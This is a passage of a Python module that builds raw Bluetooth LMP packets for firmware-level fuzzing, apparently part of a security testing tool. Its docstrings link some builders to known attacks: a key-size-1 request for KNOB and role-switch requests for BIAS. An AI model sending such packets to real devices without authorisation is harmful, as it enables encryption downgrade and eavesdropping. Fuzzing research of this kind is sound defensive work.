"""Bluetooth LMP (Link Manager Protocol) packet builder and fuzz case generator.

Constructs well-formed and malformed LMP PDUs for below-HCI protocol-aware
fuzzing via DarkFirmware on RTL8761B. LMP operates between the Link Manager
entities of two devices to negotiate link configuration: authentication,
encryption, features, clock offset, power control, and role switching.

Over-the-air encoding: first byte = (opcode << 1) | tid. However,
DarkFirmware's LMP_pkt_buf uses RAW opcodes at byte 0 and the firmware's
send_LMP_reply() handles the shift+TID encoding internally. Therefore all
builders in this module emit RAW opcode numbers.

Standard opcodes occupy 7 bits (1-126). Extended opcodes are prefixed by
escape opcode 127 (LMP_escape_4) followed by a second opcode byte.

Maximum over-the-air LMP PDU is 17 bytes. The TP-Link UB500 dongle firmware
has been patched via DarkFirmware to raise the send buffer to the full 17-byte
maximum, enabling complete LMP PDU injection without truncation.

This module provides:
  - Standard and extended LMP opcode constants with human-readable names
  - IO capability, authentication requirement, and error code constants
  - Builder functions for all security-relevant LMP operations
  - Fuzz case generators targeting encryption key size negotiation (KNOB),
    feature bitmask manipulation, truncated/oversized PDUs, undefined
    opcodes, and CVE-specific attack templates

Reference: Bluetooth Core Spec v5.4, Vol 2, Part C (LMP)
CVE targets: CVE-2019-9506 (KNOB), CVE-2020-10135 (BIAS),
             CVE-2023-24023 (BLUFFS)
"""

from __future__ import annotations

import os
import struct
from collections.abc import Generator


# ---------------------------------------------------------------------------
# Protocol Limits
# ---------------------------------------------------------------------------

MAX_LMP_PDU = 17          # Maximum over-the-air LMP PDU size (bytes)
FIRMWARE_MAX_SEND = 17    # Patched UB500 send buffer (bytes); equals MAX_LMP_PDU
                          # Original default was 10; raised via patch_send_length(0x11)


# ---------------------------------------------------------------------------
# Standard LMP Opcodes (Bluetooth Core Spec Vol 2, Part C, Section 4)
# ---------------------------------------------------------------------------

LMP_NAME_REQ = 1
LMP_NAME_RES = 2
LMP_ACCEPTED = 3
LMP_NOT_ACCEPTED = 4
LMP_CLKOFFSET_REQ = 5
LMP_CLKOFFSET_RES = 6
LMP_DETACH = 7
LMP_IN_RAND = 8
LMP_COMB_KEY = 9
LMP_UNIT_KEY = 10
LMP_AU_RAND = 11
LMP_SRES = 12
LMP_TEMP_RAND = 13
LMP_TEMP_KEY = 14
LMP_ENCRYPTION_MODE_REQ = 15
LMP_ENCRYPTION_KEY_SIZE_REQ = 16
LMP_START_ENCRYPTION_REQ = 17
LMP_STOP_ENCRYPTION_REQ = 18
LMP_SWITCH_REQ = 19
LMP_SLOT_OFFSET = 23
LMP_MAX_SLOT = 25
LMP_MAX_SLOT_REQ = 26
LMP_TIMING_ACCURACY_REQ = 27
LMP_TIMING_ACCURACY_RES = 28
LMP_SETUP_COMPLETE = 29
LMP_USE_SEMI_PERMANENT_KEY = 30
LMP_HOST_CONNECTION_REQ = 31
LMP_QUALITY_OF_SERVICE = 33
LMP_QUALITY_OF_SERVICE_REQ = 34
LMP_VERSION_REQ = 37
LMP_VERSION_RES = 38
LMP_FEATURES_REQ = 39
LMP_FEATURES_RES = 40
LMP_SUPERVISION_TIMEOUT = 51
LMP_TEST_ACTIVATE = 52
LMP_TEST_CONTROL = 53
LMP_ENCRYPTION_KEY_SIZE_MASK_REQ = 54
LMP_ENCRYPTION_KEY_SIZE_MASK_RES = 55
LMP_SET_AFH = 56
LMP_ENCAPSULATED_HEADER = 57
LMP_ENCAPSULATED_PAYLOAD = 58
LMP_SIMPLE_PAIRING_CONFIRM = 59
LMP_SIMPLE_PAIRING_NUMBER = 60
LMP_DHKEY_CHECK = 61
LMP_ESCAPE_4 = 127

# Human-readable names for logging/reporting
COMMAND_NAMES: dict[int, str] = {
    LMP_NAME_REQ: "LMP_name_req",
    LMP_NAME_RES: "LMP_name_res",
    LMP_ACCEPTED: "LMP_accepted",
    LMP_NOT_ACCEPTED: "LMP_not_accepted",
    LMP_CLKOFFSET_REQ: "LMP_clkoffset_req",
    LMP_CLKOFFSET_RES: "LMP_clkoffset_res",
    LMP_DETACH: "LMP_detach",
    LMP_IN_RAND: "LMP_in_rand",
    LMP_COMB_KEY: "LMP_comb_key",
    LMP_UNIT_KEY: "LMP_unit_key",
    LMP_AU_RAND: "LMP_au_rand",
    LMP_SRES: "LMP_sres",
    LMP_TEMP_RAND: "LMP_temp_rand",
    LMP_TEMP_KEY: "LMP_temp_key",
    LMP_ENCRYPTION_MODE_REQ: "LMP_encryption_mode_req",
    LMP_ENCRYPTION_KEY_SIZE_REQ: "LMP_encryption_key_size_req",
    LMP_START_ENCRYPTION_REQ: "LMP_start_encryption_req",
    LMP_STOP_ENCRYPTION_REQ: "LMP_stop_encryption_req",
    LMP_SWITCH_REQ: "LMP_switch_req",
    LMP_SLOT_OFFSET: "LMP_slot_offset",
    LMP_MAX_SLOT: "LMP_max_slot",
    LMP_MAX_SLOT_REQ: "LMP_max_slot_req",
    LMP_TIMING_ACCURACY_REQ: "LMP_timing_accuracy_req",
    LMP_TIMING_ACCURACY_RES: "LMP_timing_accuracy_res",
    LMP_SETUP_COMPLETE: "LMP_setup_complete",
    LMP_USE_SEMI_PERMANENT_KEY: "LMP_use_semi_permanent_key",
    LMP_HOST_CONNECTION_REQ: "LMP_host_connection_req",
    LMP_QUALITY_OF_SERVICE: "LMP_quality_of_service",
    LMP_QUALITY_OF_SERVICE_REQ: "LMP_quality_of_service_req",
    LMP_VERSION_REQ: "LMP_version_req",
    LMP_VERSION_RES: "LMP_version_res",
    LMP_FEATURES_REQ: "LMP_features_req",
    LMP_FEATURES_RES: "LMP_features_res",
    LMP_SUPERVISION_TIMEOUT: "LMP_supervision_timeout",
    LMP_TEST_ACTIVATE: "LMP_test_activate",
    LMP_TEST_CONTROL: "LMP_test_control",
    LMP_ENCRYPTION_KEY_SIZE_MASK_REQ: "LMP_encryption_key_size_mask_req",
    LMP_ENCRYPTION_KEY_SIZE_MASK_RES: "LMP_encryption_key_size_mask_res",
    LMP_SET_AFH: "LMP_set_AFH",
    LMP_ENCAPSULATED_HEADER: "LMP_encapsulated_header",
    LMP_ENCAPSULATED_PAYLOAD: "LMP_encapsulated_payload",
    LMP_SIMPLE_PAIRING_CONFIRM: "LMP_simple_pairing_confirm",
    LMP_SIMPLE_PAIRING_NUMBER: "LMP_simple_pairing_number",
    LMP_DHKEY_CHECK: "LMP_dhkey_check",
    LMP_ESCAPE_4: "LMP_escape_4",
}

# Set of all defined standard command opcodes
DEFINED_COMMANDS: frozenset[int] = frozenset(COMMAND_NAMES.keys())

# Expected PDU sizes (opcode byte + params) for each standard command.
# All commands fit within FIRMWARE_MAX_SEND (17 bytes) — the UB500 firmware
# has been patched to support the full over-the-air LMP PDU length.
COMMAND_SIZES: dict[int, int] = {
    LMP_NAME_REQ: 2,               # opcode(1) + name_offset(1)
    LMP_NAME_RES: 17,              # opcode(1) + offset(1) + length(1) + fragment(14)
    LMP_ACCEPTED: 2,               # opcode(1) + accepted_opcode(1)
    LMP_NOT_ACCEPTED: 3,           # opcode(1) + rejected_opcode(1) + error(1)
    LMP_CLKOFFSET_REQ: 1,          # opcode(1) only
    LMP_CLKOFFSET_RES: 3,          # opcode(1) + clock_offset(2)
    LMP_DETACH: 2,                 # opcode(1) + error_code(1)
    LMP_IN_RAND: 17,               # opcode(1) + random(16)
    LMP_COMB_KEY: 17,              # opcode(1) + random(16)
    LMP_UNIT_KEY: 17,              # opcode(1) + key(16)
    LMP_AU_RAND: 17,               # opcode(1) + random(16)
    LMP_SRES: 5,                   # opcode(1) + response(4)
    LMP_TEMP_RAND: 17,             # opcode(1) + random(16)
    LMP_TEMP_KEY: 2,               # opcode(1) + key_flag(1)
    LMP_ENCRYPTION_MODE_REQ: 2,    # opcode(1) + mode(1)
    LMP_ENCRYPTION_KEY_SIZE_REQ: 2, # opcode(1) + key_size(1)
    LMP_START_ENCRYPTION_REQ: 17,  # opcode(1) + random(16)
    LMP_STOP_ENCRYPTION_REQ: 1,    # opcode(1) only
    LMP_SWITCH_REQ: 5,             # opcode(1) + switch_instant(4)
    LMP_SLOT_OFFSET: 9,            # opcode(1) + slot_offset(2) + bd_addr(6)
    LMP_MAX_SLOT: 2,               # opcode(1) + max_slots(1)
    LMP_MAX_SLOT_REQ: 2,           # opcode(1) + max_slots(1)
    LMP_TIMING_ACCURACY_REQ: 1,    # opcode(1) only
    LMP_TIMING_ACCURACY_RES: 3,    # opcode(1) + drift(1) + jitter(1)
    LMP_SETUP_COMPLETE: 1,         # opcode(1) only
    LMP_USE_SEMI_PERMANENT_KEY: 1, # opcode(1) only
    LMP_HOST_CONNECTION_REQ: 1,    # opcode(1) only
    LMP_QUALITY_OF_SERVICE: 4,     # opcode(1) + poll_interval(2) + nbc(1)
    LMP_QUALITY_OF_SERVICE_REQ: 4, # opcode(1) + poll_interval(2) + nbc(1)
    LMP_VERSION_REQ: 1,            # opcode(1) only
    LMP_VERSION_RES: 6,            # opcode(1) + ver(1) + company(2) + subver(2)
    LMP_FEATURES_REQ: 1,           # opcode(1) only
    LMP_FEATURES_RES: 9,           # opcode(1) + features(8)
    LMP_SUPERVISION_TIMEOUT: 3,    # opcode(1) + timeout(2)
    LMP_TEST_ACTIVATE: 1,          # opcode(1) only
    LMP_TEST_CONTROL: 10,          # opcode(1) + 9 param bytes
    LMP_ENCRYPTION_KEY_SIZE_MASK_REQ: 1,  # opcode(1) only
    LMP_ENCRYPTION_KEY_SIZE_MASK_RES: 3,  # opcode(1) + mask(2)
    LMP_SET_AFH: 16,               # opcode(1) + instant(4) + mode(1) + map(10)
    LMP_ENCAPSULATED_HEADER: 4,    # opcode(1) + major(1) + minor(1) + length(1)
    LMP_ENCAPSULATED_PAYLOAD: 17,  # opcode(1) + data(16)
    LMP_SIMPLE_PAIRING_CONFIRM: 1, # opcode(1) only
    LMP_SIMPLE_PAIRING_NUMBER: 17, # opcode(1) + number(16)
    LMP_DHKEY_CHECK: 17,           # opcode(1) + confirmation(16)
}


# ---------------------------------------------------------------------------
# Extended LMP Opcodes (after LMP_escape_4 prefix)
# ---------------------------------------------------------------------------

EXT_ACCEPTED = 1
EXT_NOT_ACCEPTED = 2
EXT_FEATURES_REQ = 3
EXT_FEATURES_RES = 4
EXT_CLK_ADJ = 5
EXT_CLK_ADJ_ACK = 6
EXT_PACKET_TYPE_TABLE_REQ = 7
EXT_ESCO_LINK_REQ = 8
EXT_IO_CAPABILITY_REQ = 11
EXT_IO_CAPABILITY_RES = 12
EXT_NUMERIC_COMPARISON_FAILED = 13
EXT_PASSKEY_FAILED = 14
EXT_OOB_FAILED = 15
EXT_KEYPRESS_NOTIFICATION = 16
EXT_POWER_CONTROL_REQ = 17
EXT_POWER_CONTROL_RES = 18
EXT_PING_REQ = 21
EXT_PING_RES = 22

EXT_COMMAND_NAMES: dict[int, str] = {
    EXT_ACCEPTED: "accepted_ext",
    EXT_NOT_ACCEPTED: "not_accepted_ext",
    EXT_FEATURES_REQ: "features_req_ext",
    EXT_FEATURES_RES: "features_res_ext",
    EXT_CLK_ADJ: "clk_adj",
    EXT_CLK_ADJ_ACK: "clk_adj_ack",
    EXT_PACKET_TYPE_TABLE_REQ: "packet_type_table_req",
    EXT_ESCO_LINK_REQ: "eSCO_link_req",
    EXT_IO_CAPABILITY_REQ: "IO_capability_req",
    EXT_IO_CAPABILITY_RES: "IO_capability_res",
    EXT_NUMERIC_COMPARISON_FAILED: "numeric_comparison_failed",
    EXT_PASSKEY_FAILED: "passkey_failed",
    EXT_OOB_FAILED: "oob_failed",
    EXT_KEYPRESS_NOTIFICATION: "keypress_notification",
    EXT_POWER_CONTROL_REQ: "power_control_req",
    EXT_POWER_CONTROL_RES: "power_control_res",
    EXT_PING_REQ: "ping_req",
    EXT_PING_RES: "ping_res",
}

DEFINED_EXT_COMMANDS: frozenset[int] = frozenset(EXT_COMMAND_NAMES.keys())

# Extended PDU sizes: escape(1) + ext_opcode(1) + params
EXT_COMMAND_SIZES: dict[int, int] = {
    EXT_ACCEPTED: 4,                    # esc(1) + ext(1) + accepted_esc(1) + accepted_ext(1)
    EXT_NOT_ACCEPTED: 5,                # esc(1) + ext(1) + rej_esc(1) + rej_ext(1) + error(1)
    EXT_FEATURES_REQ: 12,               # esc(1) + ext(1) + page(1) + max_page(1) + features(8)
    EXT_FEATURES_RES: 12,               # esc(1) + ext(1) + page(1) + max_page(1) + features(8)
    EXT_CLK_ADJ: 10,                    # esc(1) + ext(1) + id(1) + instant(4) + us(2) + slots(1)
    EXT_CLK_ADJ_ACK: 3,                 # esc(1) + ext(1) + id(1)
    EXT_PACKET_TYPE_TABLE_REQ: 3,       # esc(1) + ext(1) + table(1)
    EXT_IO_CAPABILITY_REQ: 5,           # esc(1) + ext(1) + io_cap(1) + oob(1) + auth(1)
    EXT_IO_CAPABILITY_RES: 5,           # esc(1) + ext(1) + io_cap(1) + oob(1) + auth(1)
    EXT_NUMERIC_COMPARISON_FAILED: 2,   # esc(1) + ext(1)
    EXT_PASSKEY_FAILED: 2,              # esc(1) + ext(1)
    EXT_OOB_FAILED: 2,                  # esc(1) + ext(1)
    EXT_KEYPRESS_NOTIFICATION: 3,       # esc(1) + ext(1) + type(1)
    EXT_POWER_CONTROL_REQ: 3,           # esc(1) + ext(1) + adjustment(1)
    EXT_POWER_CONTROL_RES: 3,           # esc(1) + ext(1) + adjustment(1)
    EXT_PING_REQ: 2,                    # esc(1) + ext(1)
    EXT_PING_RES: 2,                    # esc(1) + ext(1)
}


# ---------------------------------------------------------------------------
# IO Capabilities (Bluetooth Core Spec Vol 2, Part C, Section 4.3.7.2)
# ---------------------------------------------------------------------------

IO_DISPLAY_ONLY = 0x00
IO_DISPLAY_YESNO = 0x01
IO_KEYBOARD_ONLY = 0x02
IO_NO_INPUT_OUTPUT = 0x03
IO_KEYBOARD_DISPLAY = 0x04

IO_CAPABILITY_NAMES: dict[int, str] = {
    IO_DISPLAY_ONLY: "DisplayOnly",
    IO_DISPLAY_YESNO: "DisplayYesNo",
    IO_KEYBOARD_ONLY: "KeyboardOnly",
    IO_NO_INPUT_OUTPUT: "NoInputNoOutput",
    IO_KEYBOARD_DISPLAY: "KeyboardDisplay",
}

IO_MAX_VALID = 0x04


# ---------------------------------------------------------------------------
# Authentication Requirements (Bluetooth Core Spec Vol 2, Part C)
# ---------------------------------------------------------------------------

AUTH_MITM_NOT_REQUIRED_NO_BONDING = 0x00
AUTH_MITM_REQUIRED_NO_BONDING = 0x01
AUTH_MITM_NOT_REQUIRED_DEDICATED_BONDING = 0x02
AUTH_MITM_REQUIRED_DEDICATED_BONDING = 0x03
AUTH_MITM_NOT_REQUIRED_GENERAL_BONDING = 0x04
AUTH_MITM_REQUIRED_GENERAL_BONDING = 0x05


# ---------------------------------------------------------------------------
# LMP Error Codes (Bluetooth Core Spec Vol 1, Part F, Section 1.3)
# ---------------------------------------------------------------------------

ERROR_SUCCESS = 0x00
ERROR_UNSUPPORTED_PARAMETER = 0x11
ERROR_UNKNOWN_LMP_PDU = 0x19
ERROR_TRANSACTION_COLLISION = 0x23
ERROR_PDU_NOT_ALLOWED = 0x24
ERROR_ENCRYPTION_MODE_NOT_ACCEPTABLE = 0x25
ERROR_LINK_KEY_CANNOT_BE_CHANGED = 0x26
ERROR_INSTANT_PASSED = 0x28

ERROR_NAMES: dict[int, str] = {
    ERROR_SUCCESS: "Success",
    ERROR_UNSUPPORTED_PARAMETER: "Unsupported Parameter Value",
    ERROR_UNKNOWN_LMP_PDU: "Unknown LMP PDU",
    ERROR_TRANSACTION_COLLISION: "LMP Transaction Collision",
    ERROR_PDU_NOT_ALLOWED: "LMP PDU Not Allowed",
    ERROR_ENCRYPTION_MODE_NOT_ACCEPTABLE: "Encryption Mode Not Acceptable",
    ERROR_LINK_KEY_CANNOT_BE_CHANGED: "Link Key Cannot Be Changed",
    ERROR_INSTANT_PASSED: "Instant Passed",
}


# ===========================================================================
# Packet Builders -- Standard LMP Opcodes
# ===========================================================================

def build_lmp(opcode: int, params: bytes = b"") -> bytes:
    """Build a raw LMP PDU: [opcode_byte] + [params].

    This is the low-level builder used by all other builders. The opcode
    is the RAW 7-bit value (not shifted); DarkFirmware handles encoding.

    Args:
        opcode: Raw LMP opcode (1-127).
        params: Parameter bytes to append after the opcode.

    Returns:
        Raw LMP PDU bytes.
    """
    return bytes([opcode & 0x7F]) + params


def build_name_req(name_offset: int = 0) -> bytes:
    """Build LMP_name_req (opcode 1).

    Requests a fragment of the remote device's friendly name starting
    at the given offset.

    Args:
        name_offset: Byte offset into the remote name (0-247).

    Returns:
        2-byte PDU: opcode(1) + name_offset(1).
    """
    return build_lmp(LMP_NAME_REQ, bytes([name_offset & 0xFF]))


def build_name_res(name_offset: int = 0, name: bytes = b"Blue-Tap") -> bytes:
    """Build LMP_name_res (opcode 2).

    Responds with a fragment of the local device name. The name_length
    field indicates total name length; name_fragment is up to 14 bytes.

    Args:
        name_offset: Byte offset this fragment starts at.
        name: Full device name bytes; fragment is taken from name_offset.

    Returns:
        Up to 17-byte PDU: opcode(1) + offset(1) + length(1) + fragment(14).
    """
    fragment = name[name_offset:name_offset + 14].ljust(14, b"\x00")
    return build_lmp(
        LMP_NAME_RES,
        bytes([name_offset & 0xFF, len(name) & 0xFF]) + fragment,
    )


def build_accepted(accepted_opcode: int) -> bytes:
    """Build LMP_accepted (opcode 3).

    Acknowledges a received LMP PDU.

    Args:
        accepted_opcode: Opcode of the accepted LMP PDU.

    Returns:
        2-byte PDU: opcode(1) + accepted_opcode(1).
    """
    return build_lmp(LMP_ACCEPTED, bytes([accepted_opcode & 0xFF]))


def build_not_accepted(
    rejected_opcode: int,
    error_code: int = ERROR_UNKNOWN_LMP_PDU,
) -> bytes:
    """Build LMP_not_accepted (opcode 4).

    Rejects a received LMP PDU with an error reason.

    Args:
        rejected_opcode: Opcode of the rejected LMP PDU.
        error_code: HCI error code indicating rejection reason.

    Returns:
        3-byte PDU: opcode(1) + rejected_opcode(1) + error_code(1).
    """
    return build_lmp(
        LMP_NOT_ACCEPTED,
        bytes([rejected_opcode & 0xFF, error_code & 0xFF]),
    )


def build_clkoffset_req() -> bytes:
    """Build LMP_clkoffset_req (opcode 5).

    Requests the clock offset between local and remote devices.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_CLKOFFSET_REQ)


def build_clkoffset_res(clock_offset: int = 0) -> bytes:
    """Build LMP_clkoffset_res (opcode 6).

    Responds with the clock offset value.

    Args:
        clock_offset: 16-bit clock offset (little-endian).

    Returns:
        3-byte PDU: opcode(1) + clock_offset(2 LE).
    """
    return build_lmp(LMP_CLKOFFSET_RES, struct.pack("<H", clock_offset & 0xFFFF))


def build_detach(error_code: int = 0x13) -> bytes:
    """Build LMP_detach (opcode 7).

    Terminates the ACL link with a reason code. Default 0x13 is
    "Remote User Terminated Connection".

    Args:
        error_code: HCI error code for detach reason.

    Returns:
        2-byte PDU: opcode(1) + error_code(1).
    """
    return build_lmp(LMP_DETACH, bytes([error_code & 0xFF]))


def build_in_rand(random_number: bytes | None = None) -> bytes:
    """Build LMP_in_rand (opcode 8).

    Initiates pairing by sending a 128-bit random number used to
    generate the initialization key.

    Args:
        random_number: 16-byte random value. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + random_number(16).
    """
    rand = random_number if random_number is not None else os.urandom(16)
    return build_lmp(LMP_IN_RAND, rand[:16].ljust(16, b"\x00"))


def build_comb_key(random_number: bytes | None = None) -> bytes:
    """Build LMP_comb_key (opcode 9).

    Sends a random number for combination key generation.

    Args:
        random_number: 16-byte random value. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + random_number(16).
    """
    rand = random_number if random_number is not None else os.urandom(16)
    return build_lmp(LMP_COMB_KEY, rand[:16].ljust(16, b"\x00"))


def build_unit_key(key: bytes | None = None) -> bytes:
    """Build LMP_unit_key (opcode 10).

    Sends a unit key (deprecated in BT 2.1+).

    Args:
        key: 16-byte unit key. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + key(16).
    """
    k = key if key is not None else os.urandom(16)
    return build_lmp(LMP_UNIT_KEY, k[:16].ljust(16, b"\x00"))


def build_au_rand(random_number: bytes | None = None) -> bytes:
    """Build LMP_au_rand (opcode 11).

    Sends a 128-bit random challenge for authentication. The remote
    device must respond with LMP_sres containing the E1 result.

    Args:
        random_number: 16-byte random challenge. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + random_number(16).
    """
    rand = random_number if random_number is not None else os.urandom(16)
    return build_lmp(LMP_AU_RAND, rand[:16].ljust(16, b"\x00"))


def build_sres(response: bytes = b"\x00\x00\x00\x00") -> bytes:
    """Build LMP_sres (opcode 12).

    Responds to an authentication challenge with the 32-bit signed
    response computed from E1(link_key, au_rand, bd_addr).

    Args:
        response: 4-byte authentication response.

    Returns:
        5-byte PDU: opcode(1) + authentication_response(4).
    """
    return build_lmp(LMP_SRES, response[:4].ljust(4, b"\x00"))


def build_temp_rand(random_number: bytes | None = None) -> bytes:
    """Build LMP_temp_rand (opcode 13).

    Sends a random number for temporary key generation.

    Args:
        random_number: 16-byte random value. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + random_number(16).
    """
    rand = random_number if random_number is not None else os.urandom(16)
    return build_lmp(LMP_TEMP_RAND, rand[:16].ljust(16, b"\x00"))


def build_temp_key(key_flag: int = 0) -> bytes:
    """Build LMP_temp_key (opcode 14).

    Indicates whether to use a temporary key or the semi-permanent key.

    Args:
        key_flag: 0 = use semi-permanent key, 1 = use temporary key.

    Returns:
        2-byte PDU: opcode(1) + key_flag(1).
    """
    return build_lmp(LMP_TEMP_KEY, bytes([key_flag & 0xFF]))


def build_encryption_mode_req(mode: int = 1) -> bytes:
    """Build LMP_encryption_mode_req (opcode 15).

    Requests encryption mode change. Mode 0 = off, 1 = point-to-point,
    2 = point-to-point + broadcast.

    Args:
        mode: Encryption mode (0-2).

    Returns:
        2-byte PDU: opcode(1) + encryption_mode(1).
    """
    return build_lmp(LMP_ENCRYPTION_MODE_REQ, bytes([mode & 0xFF]))


def build_enc_key_size_req(key_size: int = 16) -> bytes:
    """Build LMP_encryption_key_size_req (opcode 16).

    Negotiates the encryption key size. KNOB attack (CVE-2019-9506) forces
    key_size=1 to reduce encryption entropy to 8 bits.

    Valid range per spec: 1-16. The initiator proposes, responder
    accepts or counter-proposes. A key_size of 1 is technically valid
    per the spec but practically exploitable.

    Args:
        key_size: Proposed encryption key size in bytes (1-16).

    Returns:
        2-byte PDU: opcode(1) + key_size(1).
    """
    return build_lmp(LMP_ENCRYPTION_KEY_SIZE_REQ, bytes([key_size & 0xFF]))


def build_start_encryption_req(random_number: bytes | None = None) -> bytes:
    """Build LMP_start_encryption_req (opcode 17).

    Starts encryption with a 128-bit random number used to derive the
    encryption key from the link key.

    Args:
        random_number: 16-byte random value. Generated if None.

    Returns:
        17-byte PDU: opcode(1) + random_number(16).
    """
    rand = random_number if random_number is not None else os.urandom(16)
    return build_lmp(LMP_START_ENCRYPTION_REQ, rand[:16].ljust(16, b"\x00"))


def build_stop_encryption_req() -> bytes:
    """Build LMP_stop_encryption_req (opcode 18).

    Requests encryption to be stopped on the link.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_STOP_ENCRYPTION_REQ)


def build_switch_req(switch_instant: int = 0) -> bytes:
    """Build LMP_switch_req (opcode 19).

    Requests a central/peripheral role switch at the given instant.
    Used in BIAS attack (CVE-2020-10135) to force role switch during
    authentication.

    Args:
        switch_instant: 32-bit Bluetooth clock instant for the switch.

    Returns:
        5-byte PDU: opcode(1) + switch_instant(4 LE).
    """
    return build_lmp(LMP_SWITCH_REQ, struct.pack("<I", switch_instant & 0xFFFFFFFF))


def build_slot_offset(slot_offset: int = 0, bd_addr: bytes = b"\x00" * 6) -> bytes:
    """Build LMP_slot_offset (opcode 23).

    Informs the remote device of the slot offset and BD_ADDR.

    Args:
        slot_offset: 16-bit slot offset.
        bd_addr: 6-byte Bluetooth device address.

    Returns:
        9-byte PDU: opcode(1) + slot_offset(2 LE) + bd_addr(6).
    """
    addr = bd_addr[:6].ljust(6, b"\x00")
    return build_lmp(LMP_SLOT_OFFSET, struct.pack("<H", slot_offset & 0xFFFF) + addr)


def build_max_slot(max_slots: int = 5) -> bytes:
    """Build LMP_max_slot (opcode 25).

    Informs the remote of the maximum number of slots the local device
    can use for a packet (1, 3, or 5).

    Args:
        max_slots: Maximum slot count (1, 3, or 5).

    Returns:
        2-byte PDU: opcode(1) + max_slots(1).
    """
    return build_lmp(LMP_MAX_SLOT, bytes([max_slots & 0xFF]))


def build_max_slot_req(max_slots: int = 5) -> bytes:
    """Build LMP_max_slot_req (opcode 26).

    Requests the remote to use at most the specified number of slots.

    Args:
        max_slots: Requested maximum slot count.

    Returns:
        2-byte PDU: opcode(1) + max_slots(1).
    """
    return build_lmp(LMP_MAX_SLOT_REQ, bytes([max_slots & 0xFF]))


def build_timing_accuracy_req() -> bytes:
    """Build LMP_timing_accuracy_req (opcode 27).

    Requests the remote device's timing accuracy parameters.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_TIMING_ACCURACY_REQ)


def build_timing_accuracy_res(drift: int = 20, jitter: int = 10) -> bytes:
    """Build LMP_timing_accuracy_res (opcode 28).

    Responds with local timing accuracy values.

    Args:
        drift: Clock drift in ppm (0-250).
        jitter: Clock jitter in microseconds (0-10).

    Returns:
        3-byte PDU: opcode(1) + drift(1) + jitter(1).
    """
    return build_lmp(LMP_TIMING_ACCURACY_RES, bytes([drift & 0xFF, jitter & 0xFF]))


def build_setup_complete() -> bytes:
    """Build LMP_setup_complete (opcode 29).

    Indicates that the local Link Manager has completed setup.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_SETUP_COMPLETE)


def build_use_semi_permanent_key() -> bytes:
    """Build LMP_use_semi_permanent_key (opcode 30).

    Indicates the link should use the semi-permanent link key.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_USE_SEMI_PERMANENT_KEY)


def build_host_connection_req() -> bytes:
    """Build LMP_host_connection_req (opcode 31).

    Requests the remote host to accept an ACL connection.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_HOST_CONNECTION_REQ)


def build_quality_of_service(poll_interval: int = 40, nbc: int = 1) -> bytes:
    """Build LMP_quality_of_service (opcode 33).

    Sets QoS parameters for the link.

    Args:
        poll_interval: Poll interval in slots (16-bit LE).
        nbc: Number of broadcast retransmissions.

    Returns:
        4-byte PDU: opcode(1) + poll_interval(2 LE) + nbc(1).
    """
    return build_lmp(
        LMP_QUALITY_OF_SERVICE,
        struct.pack("<H", poll_interval & 0xFFFF) + bytes([nbc & 0xFF]),
    )


def build_quality_of_service_req(poll_interval: int = 40, nbc: int = 1) -> bytes:
    """Build LMP_quality_of_service_req (opcode 34).

    Requests QoS parameter change.

    Args:
        poll_interval: Requested poll interval in slots.
        nbc: Requested number of broadcast retransmissions.

    Returns:
        4-byte PDU: opcode(1) + poll_interval(2 LE) + nbc(1).
    """
    return build_lmp(
        LMP_QUALITY_OF_SERVICE_REQ,
        struct.pack("<H", poll_interval & 0xFFFF) + bytes([nbc & 0xFF]),
    )


def build_version_req() -> bytes:
    """Build LMP_version_req (opcode 37).

    Requests the remote device's LMP version information.

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_VERSION_REQ)


def build_version_res(
    ver: int = 0x0A,
    company: int = 0x005D,
    subver: int = 0xD922,
) -> bytes:
    """Build LMP_version_res (opcode 38).

    Responds with local LMP version information.

    Args:
        ver: LMP version number (0x0A = BT 5.1).
        company: Company identifier (0x005D = Realtek).
        subver: Subversion number.

    Returns:
        6-byte PDU: opcode(1) + ver(1) + company(2 LE) + subver(2 LE).
    """
    return build_lmp(
        LMP_VERSION_RES,
        struct.pack("<BHH", ver & 0xFF, company & 0xFFFF, subver & 0xFFFF),
    )


def build_features_req() -> bytes:
    """Build LMP_features_req (opcode 39).

    Requests the remote device's supported LMP features (page 0).

    Returns:
        1-byte PDU: opcode(1) only.
    """
    return build_lmp(LMP_FEATURES_REQ)


def build_features_res(features: bytes = b"\xff" * 8) -> bytes:
    """Build LMP_features_res (opcode 40).

    Responds with local LMP features bitmask (page 0, 64 feature bits).

    Args:
        features: 8-byte feature bitmask. Default all-ones (all features).

    Returns:
        9-byte PDU: opcode(1) + features(8).
    """
    feat = features[:8].ljust(8, b"\x00")
    return build_lmp(LMP_FEATURES_RES, feat)


def build_supervision_timeout(timeout: int = 0x7D00) -> bytes:
    """Build LMP_supervision_timeout (opcode 51).

    Sets the link supervision timeout value.

    Args:
        timeout: Supervision timeout in slots (16-bit LE). Default 20s.

    Returns:
        3-byte PDU: opcode(1) + timeout(2 LE).
    """
    return build_lmp(LMP_SUPERVISION_TIMEOUT, struct.pack("<H", timeout & 0xFFFF))


def build_test_control(
    test_scenario: int = 0,
    hopping_mode: int = 0,
    tx_freq: int = 0,
    rx_freq: int = 0,
    power_control_mode: int = 0,
    poll_period: int = 0,
    packet_type: int = 0,
    length: int = 0,
) -> bytes:
    """Build LMP_test_control (opcode 53).

    Activates a test mode on the remote device. All parameters default
    to zero (no-op test configuration).

    Args:
        test_scenario: Test scenario identifier.
        hopping_mode: Hopping mode for test.
        tx_freq: Transmit frequency.
        rx_freq: Receive frequency.
        power_control_mode: Power control mode.
        poll_period: Poll period for test.
        packet_type: Packet type for test.
        length: Test data length (16-bit LE).

    Returns:
        10-byte PDU: opcode(1) + 7 single-byte params + length(2 LE).
    """
    return build_lmp(
        LMP_TEST_CONTROL,
        bytes([
            test_scenario & 0xFF,
            hopping_mode & 0xFF,
            tx_freq & 0xFF,
            rx_freq & 0xFF,
            power_control_mode & 0xFF,
            poll_period & 0xFF,
            packet_type & 0xFF,
